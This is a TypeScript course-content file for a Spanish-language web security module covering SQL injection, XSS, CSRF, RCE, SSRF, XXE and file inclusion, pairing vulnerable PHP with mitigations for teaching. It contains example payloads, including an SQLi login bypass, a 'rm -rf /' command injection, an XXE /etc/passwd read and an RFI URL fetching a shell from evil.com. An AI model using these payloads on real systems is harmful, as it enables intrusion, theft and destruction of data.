import type { Module } from './index'

export const modulo2: Module = {
  id: 'modulo-2',
  number: 2,
  title: 'Vulnerabilidades de Datos de Entrada',
  description: 'SQLi, XSS, CSRF, RCE, SSRF, XXE, LFI, RFI y más',
  icon: 'bug',
  lessons: [
    {
      id: 'm2-sqli',
      title: 'SQL Injection (SQLi)',
      slug: 'sql-injection',
      objectives: ['Comprender cómo funciona SQL Injection', 'Explotar vulnerabilidades SQLi', 'Implementar mitigaciones con prepared statements'],
      keyPoints: [
        'Inyección de código SQL malicioso en consultas',
        'Bypass de autenticación con \' OR \'1\'=\'1',
        'Mitigación: consultas parametrizadas'
      ],
      theory: `
## ¿Qué es SQL Injection?

Ataque que permite **inyectar código SQL malicioso** en consultas a la base de datos.

### Código Vulnerable
\`\`\`php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($query);
\`\`\`

### Ataque: Bypass de autenticación
Usuario: \`' OR '1'='1' #\`

### Código Seguro
\`\`\`php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
\`\`\`
      `,
      codeExamples: [
        {
          title: 'Código vulnerable',
          code: `$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($query);`,
          language: 'php'
        },
        {
          title: 'Código seguro (Prepared Statements)',
          code: `$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();`,
          language: 'php'
        }
      ],
      activity: {
        title: 'Explotación y Mitigación de SQL Injection',
        objective: 'Configurar servidor Apache+PHP+MySQL, explotar SQLi y corregirla',
        labId: 'lab-sqli',
        steps: [
          'Instalar Apache, PHP y MySQL',
          'Crear base de datos y tabla users',
          'Implementar login vulnerable',
          'Explotar con \' OR \'1\'=\'1\' #',
          'Mitigar con prepared statements'
        ]
      }
    },
    {
      id: 'm2-xss',
      title: 'Cross-Site Scripting (XSS)',
      slug: 'xss',
      objectives: ['Comprender tipos de XSS', 'Explotar XSS reflejado y almacenado', 'Implementar sanitización y CSP'],
      keyPoints: [
        'Reflejado: código en enlace malicioso',
        'Almacenado: código en base de datos',
        'DOM-Based: manipulación del DOM'
      ],
      theory: `
## Tipos de XSS

### XSS Reflejado
El código se ejecuta inmediatamente tras hacer clic en un enlace malicioso.

### XSS Almacenado
El código malicioso se guarda en la base de datos y se ejecuta en cada carga.

### Mitigación
- Sanitizar entradas con HTML Entities
- Content Security Policy (CSP)
- DOMPurify para escape
      `,
      activity: {
        title: 'Explotación y Mitigación de XSS',
        objective: 'Explorar XSS reflejado y mitigarlo con sanitización',
        labId: 'lab-xss',
        steps: ['Crear formulario vulnerable', 'Inyectar <script>alert(1)</script>', 'Implementar sanitización']
      }
    },
    {
      id: 'm2-csrf',
      title: 'Cross-Site Request Forgery (CSRF)',
      slug: 'csrf',
      objectives: ['Comprender el ataque CSRF', 'Implementar tokens CSRF', 'Validar Referer y Origin'],
      keyPoints: [
        'Fuerza acciones no deseadas en usuario autenticado',
        'Mitigación: tokens CSRF en formularios',
        'Validar Referer y Origin'
      ],
      theory: `
## ¿Qué es CSRF?

Fuerza al usuario autenticado a ejecutar acciones no deseadas. Un atacante envía un enlace que realiza una transferencia bancaria sin consentimiento.

### Mitigación
- Tokens CSRF únicos por sesión
- Validar Referer/Origin
- SameSite en cookies
      `,
      activity: {
        title: 'Explotación y Mitigación de CSRF',
        objective: 'Simular ataque CSRF y protegerse con tokens',
        labId: 'lab-csrf',
        steps: ['Crear formulario de transferencia', 'Simular ataque CSRF', 'Implementar tokens']
      }
    },
    {
      id: 'm2-rce',
      title: 'Remote Code Execution (RCE)',
      slug: 'rce',
      objectives: ['Identificar funciones peligrosas', 'Explotar RCE', 'Mitigar con validación'],
      keyPoints: [
        'system(), exec(), eval() son peligrosas',
        'Control total del servidor',
        'Mitigación: evitar funciones de ejecución'
      ],
      theory: `
## Código Vulnerable
\`\`\`php
system($_GET['cmd']);
\`\`\`
Ataque: \`?cmd=rm -rf /\`

### Mitigación
- Evitar eval(), exec(), system(), popen()
- Validar y restringir entradas
      `,
      activity: {
        title: 'Explotación y Mitigación de RCE',
        objective: 'Explorar RCE y mitigar con escapes',
        labId: 'lab-rce',
        steps: ['Identificar funciones vulnerables', 'Explotar RCE', 'Implementar whitelist de comandos']
      }
    },
    {
      id: 'm2-ssrf',
      title: 'Server-Side Request Forgery (SSRF)',
      slug: 'ssrf',
      objectives: ['Comprender SSRF', 'Explotar acceso a recursos internos', 'Implementar validación de URLs'],
      keyPoints: [
        'Servidor hace peticiones a recursos internos',
        'Acceso a localhost, APIs internas',
        'Mitigación: validar y restringir URLs'
      ],
      theory: `
## Ejemplo de Ataque
\`\`\`
http://victima.com/fetch?url=http://localhost/admin
\`\`\`
El servidor accede a rutas internas exponiendo información.
      `,
      activity: {
        title: 'Explotación y Mitigación de SSRF',
        objective: 'Explorar SSRF y mitigarlo',
        labId: 'lab-ssrf',
        steps: ['Crear endpoint que hace fetch a URL', 'Explotar acceso a localhost', 'Implementar whitelist de dominios']
      }
    },
    {
      id: 'm2-xxe',
      title: 'XML External Entities (XXE)',
      slug: 'xxe',
      objectives: ['Comprender XXE', 'Leer archivos del servidor', 'Deshabilitar entidades externas'],
      keyPoints: [
        'Parser XML permite cargar entidades externas',
        'Lectura de /etc/passwd',
        'Mitigación: deshabilitar entidades externas'
      ],
      theory: `
## Ataque XXE
\`\`\`xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
\`\`\`
      `,
      activity: {
        title: 'Explotación y Mitigación de XXE',
        objective: 'Explorar XXE y mitigarlo',
        labId: 'lab-xxe',
        steps: ['Crear parser XML vulnerable', 'Explotar lectura de archivos', 'Configurar parser en modo seguro']
      }
    },
    {
      id: 'm2-lfi',
      title: 'Local File Inclusion (LFI)',
      slug: 'lfi',
      objectives: ['Comprender LFI', 'Leer archivos del servidor', 'Implementar whitelist'],
      keyPoints: [
        'Inclusión de archivos locales',
        'Lectura de /etc/passwd, config.php',
        'Mitigación: whitelist de archivos'
      ],
      theory: `
## Ataque LFI
\`\`\`
http://victima.com/index.php?file=../../../../etc/passwd
\`\`\`
      `,
      activity: {
        title: 'Explotación y Mitigación de LFI',
        objective: 'Leer archivos del servidor y mitigar',
        labId: 'lab-lfi',
        steps: ['Crear include vulnerable', 'Explotar path traversal', 'Implementar whitelist']
      }
    },
    {
      id: 'm2-rfi',
      title: 'Remote File Inclusion (RFI)',
      slug: 'rfi',
      objectives: ['Comprender RFI', 'Ejecutar código remoto', 'Deshabilitar allow_url_include'],
      keyPoints: [
        'Inclusión de archivos remotos',
        'Ejecución de shells maliciosos',
        'Mitigación: deshabilitar allow_url_include'
      ],
      theory: `
## Ataque RFI
\`\`\`
http://victima.com/index.php?page=http://evil.com/shell.php
\`\`\`
      `,
      activity: {
        title: 'Explotación y Mitigación de RFI',
        objective: 'Ejecutar código remoto y mitigar',
        labId: 'lab-rfi',
        steps: ['Habilitar allow_url_include', 'Explotar RFI', 'Deshabilitar y usar whitelist']
      }
    },
    {
      id: 'm2-deserialization',
      title: 'Unsafe Deserialization',
      slug: 'unsafe-deserialization',
      objectives: ['Comprender deserialización insegura', 'Explotar objetos maliciosos', 'Usar JSON en lugar de serialize'],
      keyPoints: [
        'unserialize() sin validación es peligroso',
        'Objetos maliciosos ejecutan código',
        'Mitigación: JSON, validación, whitelist'
      ],
      theory: `
## Código Vulnerable
\`\`\`php
unserialize($_POST['data']);
\`\`\`
Un atacante puede crear objetos que ejecuten código al deserializar.
      `,
      activity: {
        title: 'Explotación y Mitigación de Unsafe Deserialization',
        objective: 'Explorar deserialización insegura y mitigar con JSON',
        labId: 'lab-deserialization',
        steps: ['Crear endpoint que deserializa', 'Explotar con objeto malicioso', 'Migrar a JSON']
      }
    }
  ]
}
